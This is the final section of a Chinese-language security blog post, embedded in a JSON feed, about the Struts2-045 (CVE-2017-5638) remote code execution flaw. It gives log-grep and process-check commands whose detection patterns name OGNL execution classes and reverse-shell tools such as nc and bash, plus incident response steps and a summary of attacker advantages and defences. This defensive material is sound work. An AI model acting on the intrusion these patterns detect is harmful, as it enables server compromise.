class=\"hljs-regexp\">/apache2/</span>access.log<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;ognl|ProcessBuilder|Runtime&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/tomcat/</span>catalina.out<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-应急处置\"><a href=\"#2-应急处置\" class=\"headerlink\" title=\"2. 应急处置\"></a>2. 应急处置</h3><figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"># 临时阻断攻击IP<br>iptables -A <span class=\"hljs-keyword\">INPUT</span> -s &lt;攻击IP&gt; -j <span class=\"hljs-keyword\">DROP</span><br><br># 停止相关服务<br>systemctl <span class=\"hljs-keyword\">stop</span> tomcat<br>systemctl <span class=\"hljs-keyword\">stop</span> apache2<br><br># 备份系统状态<br>tar -czf /tmp/system_backup_$(date +<span class=\"hljs-title function_\">%Y</span><span class=\"hljs-title function_\">%m</span><span class=\"hljs-title function_\">%d_</span><span class=\"hljs-title function_\">%H</span><span class=\"hljs-title function_\">%M</span><span class=\"hljs-title function_\">%S</span>).tar.gz /var/log /etc /opt/tomcat<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-痕迹清理检查\"><a href=\"#3-痕迹清理检查\" class=\"headerlink\" title=\"3. 痕迹清理检查\"></a>3. 痕迹清理检查</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\"># 检查是否有异常进程<br><span class=\"hljs-keyword\">ps</span> aux | <span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;nc|bash|sh|python|perl&quot;</span> | <span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-keyword\">grep</span><br><br># 检查网络连接<br>netstat -antlp | <span class=\"hljs-keyword\">grep</span> ESTABLISHED<br><br># 检查新增文件<br><span class=\"hljs-keyword\">find</span> /tmp /var/tmp -<span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">f</span> -mtime -<span class=\"hljs-number\">1</span><br><span class=\"hljs-keyword\">find</span> /<span class=\"hljs-keyword\">opt</span>/tomcat/webapps -name <span class=\"hljs-string\">&quot;*.jsp&quot;</span> -mtime -<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>Struts2-045漏洞的特点：</p>\n<h3 id=\"优势（从攻击者角度）\"><a href=\"#优势（从攻击者角度）\" class=\"headerlink\" title=\"优势（从攻击者角度）\"></a>优势（从攻击者角度）</h3><ul>\n<li><strong>利用简单</strong>: 只需构造HTTP请求头即可</li>\n<li><strong>影响面广</strong>: 大量企业级应用使用Struts2框架</li>\n<li><strong>检测困难</strong>: 攻击流量可能被忽略</li>\n<li><strong>危害严重</strong>: 直接获得服务器执行权限</li>\n</ul>\n<h3 id=\"防护要点\"><a href=\"#防护要点\" class=\"headerlink\" title=\"防护要点\"></a>防护要点</h3><ul>\n<li><strong>及时更新</strong>: 升级到安全版本是根本解决方案</li>\n<li><strong>深度防御</strong>: 结合WAF、IDS等多层防护</li>\n<li><strong>监控告警</strong>: 建立有效的安全监控体系</li>\n<li><strong>应急响应</strong>: 制定完善的安全事件响应流程</li>\n</ul>\n<hr>\n<blockquote>\n<p><strong>免责声明</strong>: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n<p><strong>参考资源</strong>:</p>\n<ul>\n<li><a href=\"https://struts.apache.org/announce.html#a20170307\">Apache Struts2官方安全公告</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\">CVE-2017-5638详细信息</a></li>\n<li><a href=\"https://owasp.org/www-project-top-ten/\">OWASP Struts2安全指南</a></li>\n</ul>\n",
            "tags": [
                "Web安全",
                "Struts2",
                "RCE",
                "漏洞复现",
                "OGNL注入"
            ]
        }
    ]
}